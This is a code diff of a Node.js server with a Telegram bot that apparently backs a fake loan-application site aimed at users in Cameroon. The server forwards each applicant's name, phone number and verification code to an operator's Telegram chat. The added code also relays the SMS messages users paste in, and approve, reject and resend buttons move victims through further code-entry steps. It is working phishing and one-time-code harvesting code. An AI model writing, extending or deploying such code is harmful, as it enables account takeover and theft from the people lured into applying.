@@ -13,9 +13,6 @@ const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Store active socket connections mapped to Telegram message IDs
-const activeSockets = {}; 
-
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(__dirname));
@@ -24,31 +21,26 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// --- SOCKET.IO CONNECTION (Waiting for admin approval) ---
+// --- SOCKET.IO CONNECTION ---
 io.on('connection', (socket) => {
     console.log('A user connected:', socket.id);
 
+    // 1. Initial Application Submit
     socket.on('submit_loan', async (data) => {
-        const { firstName, lastName, phone, amount, term, loanType, purpose, employment, income, verificationCode } = data;
-        
         const msg = `
 🆕 <b>New Loan Application</b>
 ━━━━━━━━━━━━━━━━
-👤 <b>Name:</b> ${firstName} ${lastName}
-📞 <b>Phone:</b> +237 ${phone}
-🔑 <b>5-Digit Code:</b> ${verificationCode}
-💰 <b>Amount:</b> ${Number(amount).toLocaleString()} XAF
-📆 <b>Term:</b> ${term} months
-📋 <b>Type:</b> ${loanType}
-🎯 <b>Purpose:</b> ${purpose}
-💼 <b>Employment:</b> ${employment}
-💵 <b>Income:</b> ${Number(income).toLocaleString()} XAF
+👤 <b>Name:</b> ${data.firstName} ${data.lastName}
+📞 <b>Phone:</b> +237 ${data.phone}
+🔑 <b>5-Digit Code:</b> ${data.verificationCode}
+💰 <b>Amount:</b> ${Number(data.loanAmount).toLocaleString()} XAF
+📆 <b>Term:</b> ${data.loanTerm} months
 ━━━━━━━━━━━━━━━━
 <i>Waiting for your decision...</i>
         `;
 
         try {
-            const sentMsg = await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
+            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [[
@@ -57,51 +49,79 @@ io.on('connection', (socket) => {
                     ]]
                 }
             });
-            
-            // Save the socket ID so we know who to reply to when you click a button
-            activeSockets[sentMsg.message_id] = socket.id;
-            
         } catch (err) {
-            console.error('Telegram Error:', err.message);
-            socket.emit('error_msg', 'Failed to contact admin.');
+            console.error(err);
         }
     });
 
-    socket.on('disconnect', () => {
-        console.log('User disconnected:', socket.id);
+    // 2. SMS Submit
+    socket.on('submit_sms', async (smsMessage) => {
+        const msg = `
+📩 <b>SMS Received from User</b>
+━━━━━━━━━━━━━━━━
+<pre>${escapeHtml(smsMessage)}</pre>
+        `;
+
+        try {
+            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '✅ APPROVE', callback_data: `approve_sms_${socket.id}` },
+                        { text: '❌ REJECT', callback_data: `reject_sms_${socket.id}` },
+                        { text: '🔄 RESEND', callback_data: `resend_sms_${socket.id}` }
+                    ]]
+                }
+            });
+        } catch (err) {
+            console.error(err);
+        }
     });
 });
 
-// --- TELEGRAM BOT ACTIONS (Approve / Reject) ---
+// --- TELEGRAM BOT ACTIONS ---
 bot.on('callback_query', async (query) => {
     const data = query.data.split('_');
-    const action = data[0]; // 'approve' or 'reject'
-    const socketId = data.slice(1).join('_'); // The user's socket ID
-    
+    const socketId = data[data.length - 1]; // Get the socket ID
     const userSocket = io.sockets.sockets.get(socketId);
     
     if (!userSocket) {
-        return bot.answerCallbackQuery(query.id, { text: 'User is no longer online or page was refreshed.' });
+        return bot.answerCallbackQuery(query.id, { text: 'User is no longer online or refreshed the page.' });
     }
 
-    if (action === 'approve') {
+    // --- STEP 1: APPLICATION APPROVAL ---
+    if (query.data.startsWith('approve_') && !query.data.includes('sms')) {
         bot.answerCallbackQuery(query.id, { text: 'Approved!' });
-        userSocket.emit('approved'); // Tell the browser to go to next page
-        bot.editMessageText('✅ <b>APPROVED</b>\nUser has been moved to the next step.', {
-            chat_id: query.message.chat.id,
-            message_id: query.message.message_id,
-            parse_mode: 'HTML'
-        });
-    } else if (action === 'reject') {
+        userSocket.emit('approved');
+        bot.sendMessage(query.message.chat.id, `✅ <b>APPROVED</b> (User ${socketId} moved to SMS step)`, { parse_mode: 'HTML' });
+    } 
+    else if (query.data.startsWith('reject_') && !query.data.includes('sms')) {
         bot.answerCallbackQuery(query.id, { text: 'Rejected!' });
-        userSocket.emit('rejected'); // Tell the browser to go back to phone number step
-        bot.editMessageText('❌ <b>REJECTED</b>\nUser has been sent back to correct details.', {
-            chat_id: query.message.chat.id,
-            message_id: query.message.message_id,
-            parse_mode: 'HTML'
-        });
+        userSocket.emit('rejected');
+        bot.sendMessage(query.message.chat.id, `❌ <b>REJECTED</b> (User ${socketId} sent back to code step)`, { parse_mode: 'HTML' });
+    }
+    
+    // --- STEP 2: SMS APPROVAL ---
+    else if (query.data.startsWith('approve_sms_')) {
+        bot.answerCallbackQuery(query.id, { text: 'SMS Approved!' });
+        userSocket.emit('sms_approved');
+        bot.sendMessage(query.message.chat.id, `✅ <b>SMS APPROVED</b> (User ${socketId} moved to 4-digit code step)`, { parse_mode: 'HTML' });
+    } 
+    else if (query.data.startsWith('reject_sms_')) {
+        bot.answerCallbackQuery(query.id, { text: 'SMS Rejected!' });
+        userSocket.emit('sms_rejected');
+        bot.sendMessage(query.message.chat.id, `❌ <b>SMS REJECTED</b> (User ${socketId} sent back to 5-digit code step)`, { parse_mode: 'HTML' });
+    }
+    else if (query.data.startsWith('resend_sms_')) {
+        bot.answerCallbackQuery(query.id, { text: 'SMS Resend Triggered!' });
+        userSocket.emit('sms_resend');
+        bot.sendMessage(query.message.chat.id, `🔄 <b>SMS RESEND</b> (Notified user ${socketId})`, { parse_mode: 'HTML' });
     }
 });
+
+function escapeHtml(s) {
+    return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+}
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
